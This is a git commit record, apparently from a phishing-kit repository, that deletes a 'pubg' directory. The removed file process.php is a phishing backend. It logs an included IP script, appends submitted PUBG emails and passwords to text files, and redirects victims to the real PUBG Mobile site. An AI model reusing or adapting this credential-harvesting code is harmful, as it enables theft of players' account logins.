993689b1d77b1cfe8b3e2eb185bd0da4992b0744
Mr.Ruthless Devil <77040067+RDXLR@users.noreply.github.com>
2022-04-07 15:27:19 +0530

    Delete pubg directory

--- pubg/process.php
+++
@@ -1,8 +0,0 @@
-<?php
-include 'ip.php';
-file_put_contents("usernames.txt", "Pubg Email : " . $email = $_POST['email'] . "\n", FILE_APPEND);
-?>
-<?php
-file_put_contents("pass.txt", "Pubg Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://www.pubgmobile.com');
-?>
